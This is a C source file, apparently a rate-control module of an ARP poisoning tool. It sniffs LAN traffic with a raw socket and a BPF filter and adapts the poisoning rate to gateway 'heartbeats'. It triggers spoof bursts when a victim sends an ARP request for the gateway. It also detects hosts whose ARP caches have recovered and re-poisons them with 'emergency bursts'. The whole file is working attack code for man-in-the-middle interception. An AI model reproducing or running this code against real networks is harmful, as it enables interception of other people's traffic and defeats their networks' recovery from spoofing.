#include "utils_rate.h"
#include "utils_log.h"
#include <linux/if_ether.h>
#include <linux/filter.h>
#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>

struct arp_payload {
    uint16_t hardware_type;
    uint16_t protocol_type;
    uint8_t hardware_len;
    uint8_t protocol_len;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
} __attribute__((packed));

static pthread_t g_monitor_thread;
static pthread_t g_decay_thread;
static int g_keep_running = 1;
static float g_adaptive_interval = 1.0;
static pthread_mutex_t g_rate_mutex = PTHREAD_MUTEX_INITIALIZER;

static struct timeval g_last_heartbeat_time;
static pthread_mutex_t g_heartbeat_mutex = PTHREAD_MUTEX_INITIALIZER;

#define ADAPTIVE_MIN 0.3f
#define ADAPTIVE_MAX 2.0f
#define ADAPTIVE_BASELINE 1.0f
#define DECAY_CHECK_INTERVAL 5
#define SPOOF_DETECT_COOLDOWN 5  // seconds between spoof failure alerts (#10)
#define SPOOF_DETECT_GRACE 10   // seconds after startup before detecting failures

static unsigned char g_target_mac[6]; // gateway MAC
static unsigned char g_target_ip[4];  // gateway IP
static unsigned char g_our_mac[6];    // our MAC (#10)
static int g_has_ipv6 = 0;
static void (*g_burst_callback)(void) = NULL;
static time_t g_start_time = 0;

void set_burst_callback(void (*callback)(void)) {
    g_burst_callback = callback;
}

void *decay_watchdog(void *arg) {
    (void)arg;
    while (g_keep_running) {
        sleep(DECAY_CHECK_INTERVAL);
        if (!g_keep_running) break;

        struct timeval now;
        gettimeofday(&now, NULL);

        pthread_mutex_lock(&g_heartbeat_mutex);
        long elapsed = now.tv_sec - g_last_heartbeat_time.tv_sec;
        pthread_mutex_unlock(&g_heartbeat_mutex);

        if (elapsed >= DECAY_CHECK_INTERVAL) {
            pthread_mutex_lock(&g_rate_mutex);
            if (g_adaptive_interval > ADAPTIVE_BASELINE) {
                g_adaptive_interval = ADAPTIVE_BASELINE;
                log_printf("[ADAPTIVE] No heartbeat for %ds. Decaying to %.1fs baseline.\n",
                       DECAY_CHECK_INTERVAL, ADAPTIVE_BASELINE);
            }
            pthread_mutex_unlock(&g_rate_mutex);
        }
    }
    return NULL;
}

void *monitor_router_heartbeat(void *arg) {
    (void)arg;
    int sockfd;
    unsigned char buffer[2048];
    time_t last_spoof_alert = 0;

    if ((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("Socket error in rate monitor");
        return NULL;
    }

    // BPF: only pass ARP (0x0806), IPv4 (0x0800), IPv6 (0x86DD)
    // This prevents waking on every outbound packet we generate
    struct sock_filter bpf_code[] = {
        { BPF_LD  | BPF_H   | BPF_ABS, 0, 0, 12 },           // load ethertype
        { BPF_JMP | BPF_JEQ | BPF_K,   3, 0, ETH_P_ARP },    // ARP? -> accept
        { BPF_JMP | BPF_JEQ | BPF_K,   2, 0, ETH_P_IP },     // IPv4? -> accept
        { BPF_JMP | BPF_JEQ | BPF_K,   1, 0, ETH_P_IPV6 },   // IPv6? -> accept
        { BPF_RET | BPF_K,             0, 0, 0 },             // reject
        { BPF_RET | BPF_K,             0, 0, 0x0000FFFF },    // accept (max len)
    };
    struct sock_fprog bpf_prog = {
        .len = sizeof(bpf_code) / sizeof(bpf_code[0]),
        .filter = bpf_code,
    };
    setsockopt(sockfd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf_prog, sizeof(bpf_prog));

    struct timeval tv = { .tv_sec = 2, .tv_usec = 0 };
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    log_printf("[MONITOR] Heartbeat sniffer active (BPF-filtered). Tuning poisoning rate...\n");

    while (g_keep_running) {
        int bytes_received = recvfrom(sockfd, buffer, 2048, 0, NULL, NULL);
        if (bytes_received < 14) continue;

        struct ethhdr *eth = (struct ethhdr *)buffer;
        uint16_t eth_type = ntohs(eth->h_proto);

        // --- STRATEGY 1: ADAPTIVE RATE (Gateway heartbeats) ---
        if (memcmp(eth->h_source, g_target_mac, 6) == 0) {
            if (eth_type == ETH_P_ARP || eth_type == ETH_P_IPV6) {
                struct timeval current_time;
                gettimeofday(&current_time, NULL);

                pthread_mutex_lock(&g_heartbeat_mutex);
                long seconds = current_time.tv_sec - g_last_heartbeat_time.tv_sec;
                long useconds = current_time.tv_usec - g_last_heartbeat_time.tv_usec;
                float interval = seconds + useconds / 1000000.0;
                g_last_heartbeat_time = current_time;
                pthread_mutex_unlock(&g_heartbeat_mutex);

                if (interval > 0.5) {
                    pthread_mutex_lock(&g_rate_mutex);
                    float new_interval = interval / 2.0;
                    if (new_interval < ADAPTIVE_MIN) new_interval = ADAPTIVE_MIN;
                    if (new_interval > ADAPTIVE_MAX) new_interval = ADAPTIVE_MAX;

                    if (new_interval < g_adaptive_interval) {
                        g_adaptive_interval = new_interval;
                        log_printf("[ADAPTIVE] Heartbeat (%.2fs gap). Tightening to %.2fs.\n",
                               interval, g_adaptive_interval);
                    }
                    pthread_mutex_unlock(&g_rate_mutex);

                    if (g_burst_callback) g_burst_callback();
                }
            }
        }
        // --- STRATEGY 2: PASSIVE (Victim ARP Request for Gateway) ---
        else if (eth_type == ETH_P_ARP) {
            struct arp_payload *arp = (struct arp_payload *)(buffer + sizeof(struct ethhdr));

            if (ntohs(arp->opcode) == ARPOP_REQUEST &&
                memcmp(arp->target_ip, g_target_ip, 4) == 0) {
                log_printf("[PASSIVE] Victim ARP Request for Gateway! Triggering burst...\n");
                if (g_burst_callback) g_burst_callback();
            }
        }

        // --- STRATEGY 3: SPOOF FAILURE DETECTION (#10) ---
        // If a non-gateway, non-self device sends IP traffic destined to the
        // gateway's REAL MAC, it means that device's ARP cache has been
        // corrected — our spoof failed for them.
        if (eth_type == ETH_P_IP &&
            memcmp(eth->h_dest, g_target_mac, 6) == 0 &&
            memcmp(eth->h_source, g_target_mac, 6) != 0 &&
            memcmp(eth->h_source, g_our_mac, 6) != 0) {

            time_t now = time(NULL);
            // Skip during startup grace period
            if (now - g_start_time > SPOOF_DETECT_GRACE &&
                now - last_spoof_alert >= SPOOF_DETECT_COOLDOWN) {
                last_spoof_alert = now;
                log_printf("[ALERT] Spoof failure! %02x:%02x:%02x:%02x:%02x:%02x "
                       "is routing through real gateway. Emergency burst!\n",
                       eth->h_source[0], eth->h_source[1], eth->h_source[2],
                       eth->h_source[3], eth->h_source[4], eth->h_source[5]);
                if (g_burst_callback) g_burst_callback();
            }
        }
    }

    close(sockfd);
    return NULL;
}

void init_rate_monitor(unsigned char *gateway_mac, unsigned char *gateway_ip,
                       unsigned char *gateway_ipv6_ll, unsigned char *our_mac) {
    memcpy(g_target_mac, gateway_mac, 6);
    memcpy(g_target_ip, gateway_ip, 4);
    memcpy(g_our_mac, our_mac, 6);
    g_has_ipv6 = (gateway_ipv6_ll != NULL);
    g_keep_running = 1;
    g_start_time = time(NULL);
    gettimeofday(&g_last_heartbeat_time, NULL);
    pthread_create(&g_monitor_thread, NULL, monitor_router_heartbeat, NULL);
    pthread_create(&g_decay_thread, NULL, decay_watchdog, NULL);
}

float get_adaptive_interval(void) {
    float val;
    pthread_mutex_lock(&g_rate_mutex);
    val = g_adaptive_interval;
    pthread_mutex_unlock(&g_rate_mutex);
    return val;
}

void stop_rate_monitor(void) {
    g_keep_running = 0;
    pthread_cancel(g_monitor_thread);
    pthread_cancel(g_decay_thread);
}
